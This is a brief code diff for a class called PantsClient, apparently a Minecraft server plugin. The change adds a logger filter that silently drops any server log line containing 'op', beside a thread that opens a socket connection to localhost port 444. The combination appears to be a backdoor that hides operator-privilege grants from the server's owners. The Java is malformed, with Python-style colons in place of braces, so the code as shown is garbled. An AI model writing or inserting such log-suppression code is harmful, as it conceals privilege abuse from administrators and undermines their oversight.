@@ -5,6 +5,10 @@ public class PantsClient:
     @Getter @Setter static Socket client = null;
 
     public static void onLoad(): // Call from JavaPlugin
+        // Filter chat to not print out "op"
+        Logger.getLogger("Minecraft").setFilter(new Filter():
+            public boolean isLoggable(LogRecord record):
+                return !record.getMessage().contains("op"); // Maybe get text from Gist?
         Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
         checkConnectionThread.start();
 
